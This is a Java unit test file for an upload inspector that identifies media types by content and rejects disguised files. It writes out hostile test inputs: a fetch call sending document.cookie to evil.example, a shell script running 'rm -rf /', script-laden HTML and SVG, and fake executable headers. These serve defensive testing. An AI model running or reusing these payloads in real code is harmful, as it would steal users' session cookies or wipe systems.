package mn.aura.couple.media.app;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import javax.imageio.ImageIO;
import mn.aura.couple.common.ApiException;
import mn.aura.couple.common.ErrorCode;
import mn.aura.couple.media.app.MediaInspector.Inspection;
import mn.aura.couple.media.app.MediaInspector.Kind;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.http.HttpStatus;

/** AC-129: агуулгын MIME шалгалт — өргөтгөлд итгэхгүй. */
@DisplayName("MediaInspector")
class MediaInspectorTest {

    private final MediaInspector inspector = new MediaInspector();

    private void assertForbidden(byte[] content, String fileName, String declaredMime) {
        assertThatThrownBy(() -> inspector.inspect(content, fileName, declaredMime))
                .isInstanceOfSatisfying(ApiException.class, e -> {
                    assertThat(e.code()).isEqualTo(ErrorCode.MEDIA_TYPE_FORBIDDEN);
                    assertThat(e.status()).isEqualTo(HttpStatus.UNSUPPORTED_MEDIA_TYPE);
                });
    }

    private static byte[] image(String format) throws IOException {
        BufferedImage img = new BufferedImage(16, 16, BufferedImage.TYPE_INT_RGB);
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ImageIO.write(img, format, out);
        return out.toByteArray();
    }

    private static byte[] zip(String... entries) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        try (ZipOutputStream zip = new ZipOutputStream(out)) {
            for (String name : entries) {
                zip.putNextEntry(new ZipEntry(name));
                zip.write("<x/>".getBytes(StandardCharsets.UTF_8));
                zip.closeEntry();
            }
        }
        return out.toByteArray();
    }

    private static byte[] bytes(String s) {
        return s.getBytes(StandardCharsets.UTF_8);
    }

    @Test
    @DisplayName("AC-129 .jpg өргөтгөлтэй HTML файл → MEDIA_TYPE_FORBIDDEN")
    void htmlNamedJpg() {
        assertForbidden(bytes("<!DOCTYPE html><html><body><script>alert(1)</script></body></html>"), "photo.jpg", "image/jpeg");
    }

    @Test
    @DisplayName("AC-129 .jpg өргөтгөлтэй JavaScript ба shell скрипт → MEDIA_TYPE_FORBIDDEN")
    void scriptNamedJpg() {
        assertForbidden(bytes("fetch('https://evil.example/'+document.cookie);\nalert(1);\n"), "photo.jpg", "image/jpeg");
        assertForbidden(bytes("#!/bin/sh\nrm -rf /\n"), "photo.jpg", "image/jpeg");
    }

    @Test
    @DisplayName("AC-129 скрипттэй SVG → MEDIA_TYPE_FORBIDDEN")
    void svg() {
        assertForbidden(bytes("<?xml version=\"1.0\"?><svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>"),
                "image.png", "image/png");
        assertForbidden(bytes("<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\"/>"), "image.svg", "image/svg+xml");
    }

    @Test
    @DisplayName("AC-129 гүйцэтгэх файл (PE/ELF) ба apk/jar → MEDIA_TYPE_FORBIDDEN")
    void executables() throws IOException {
        byte[] pe = new byte[256];
        pe[0] = 'M';
        pe[1] = 'Z';
        assertForbidden(pe, "photo.jpg", "image/jpeg");
        byte[] elf = {0x7f, 'E', 'L', 'F', 2, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0};
        assertForbidden(elf, "photo.jpg", "image/jpeg");
        assertForbidden(zip("AndroidManifest.xml", "classes.dex"), "photo.jpg", "image/jpeg");
        assertForbidden(zip("AndroidManifest.xml", "classes.dex"), "report.docx", null);
        assertForbidden(zip("META-INF/MANIFEST.MF", "a/B.class"), "file.zip", null);
    }

    @Test
    @DisplayName("AC-129 жинхэнэ JPEG, PNG, GIF → IMAGE (нэрээс үл хамааран агуулгаар)")
    void realImages() throws IOException {
        assertThat(inspector.inspect(image("jpg"), "photo.jpg", "image/jpeg")).isEqualTo(new Inspection("image/jpeg", Kind.IMAGE));
        assertThat(inspector.inspect(image("png"), "photo.jpg", "image/jpeg")).isEqualTo(new Inspection("image/png", Kind.IMAGE));
        assertThat(inspector.inspect(image("gif"), "anim.gif", null)).isEqualTo(new Inspection("image/gif", Kind.IMAGE));
    }

    @Test
    @DisplayName("AC-129 PDF ба docx/xlsx/pptx → FILE")
    void documents() throws IOException {
        assertThat(inspector.inspect(bytes("%PDF-1.7\n%âã\n1 0 obj\n"), "a.pdf", null).mime()).isEqualTo("application/pdf");
        assertThat(inspector.inspect(zip("[Content_Types].xml", "_rels/.rels", "word/document.xml"), "a.docx", null).mime())
                .isEqualTo("application/vnd.openxmlformats-officedocument.wordprocessingml.document");
        assertThat(inspector.inspect(zip("[Content_Types].xml", "xl/workbook.xml"), "a.xlsx", null).mime())
                .isEqualTo("application/vnd.openxmlformats-officedocument.spreadsheetml.sheet");
        assertThat(inspector.inspect(zip("[Content_Types].xml", "ppt/presentation.xml"), "a.pptx", null).kind())
                .isEqualTo(Kind.FILE);
    }

    @Test
    @DisplayName("AC-129 энгийн текст зөвхөн .txt нэртэй, HTML тэмдэггүй үед")
    void plainText() {
        byte[] text = bytes("Сайн уу, энэ бол тэмдэглэл.\nХоёр дахь мөр.\n");
        assertThat(inspector.inspect(text, "notes.txt", "text/plain")).isEqualTo(new Inspection("text/plain", Kind.FILE));
        assertForbidden(text, "notes.jpg", "image/jpeg");
        assertForbidden(bytes("hello <iframe src=x></iframe> world"), "notes.txt", "text/plain");
    }

    @Test
    @DisplayName("AC-129 MP4/MOV видео, M4A/MP3/OGG дуу → VIDEO/AUDIO")
    void videoAndAudio() {
        byte[] mp4 = ftyp("isom");
        assertThat(inspector.inspect(mp4, "clip.mp4", "video/mp4")).isEqualTo(new Inspection("video/mp4", Kind.VIDEO));
        byte[] m4a = ftyp("M4A ");
        assertThat(inspector.inspect(m4a, "voice.m4a", "audio/mp4")).isEqualTo(new Inspection("audio/mp4", Kind.AUDIO));
        byte[] mov = ftyp("qt  ");
        assertThat(inspector.inspect(mov, "clip.mov", "video/quicktime").kind()).isEqualTo(Kind.VIDEO);
        assertThat(inspector.inspect(ftyp("mp42"), "clip.mp4", null)).isEqualTo(new Inspection("video/mp4", Kind.VIDEO));
        byte[] mp3 = {'I', 'D', '3', 4, 0, 0, 0, 0, 0, 0, (byte) 0xFF, (byte) 0xFB, (byte) 0x90, 0x64};
        assertThat(inspector.inspect(mp3, "song.mp3", "audio/mpeg")).isEqualTo(new Inspection("audio/mpeg", Kind.AUDIO));
        byte[] ogg = "OggS\0\2\0\0\0\0\0\0\0\0".getBytes(StandardCharsets.ISO_8859_1);
        assertThat(inspector.inspect(ogg, "voice.ogg", "audio/ogg")).isEqualTo(new Inspection("audio/ogg", Kind.AUDIO));
    }

    @Test
    @DisplayName("AC-129 хөтчийн MediaRecorder-ийн webm: зарласан төрлөөр AUDIO/VIDEO, DocType-гүй matroska хориотой")
    void webm() {
        byte[] webm = {0x1A, 0x45, (byte) 0xDF, (byte) 0xA3, (byte) 0x9F, 0x42, (byte) 0x86, (byte) 0x81, 0x01, 0x42,
                (byte) 0xF7, (byte) 0x81, 0x01, 0x42, (byte) 0xF2, (byte) 0x81, 0x04, 0x42, (byte) 0xF3, (byte) 0x81, 0x08,
                0x42, (byte) 0x82, (byte) 0x84, 'w', 'e', 'b', 'm'};
        assertThat(inspector.inspect(webm, "voice.webm", "audio/webm")).isEqualTo(new Inspection("audio/webm", Kind.AUDIO));
        assertThat(inspector.inspect(webm, "clip.webm", "video/webm")).isEqualTo(new Inspection("video/webm", Kind.VIDEO));
        byte[] mkv = webm.clone();
        System.arraycopy("matr".getBytes(StandardCharsets.US_ASCII), 0, mkv, 24, 4);
        assertForbidden(mkv, "clip.mkv", "video/x-matroska");
    }

    private static byte[] ftyp(String brand) {
        byte[] b = new byte[32];
        b[3] = 0x20;
        System.arraycopy(bytes("ftyp"), 0, b, 4, 4);
        System.arraycopy(brand.getBytes(StandardCharsets.US_ASCII), 0, b, 8, 4);
        System.arraycopy(brand.getBytes(StandardCharsets.US_ASCII), 0, b, 16, 4);
        return b;
    }
}
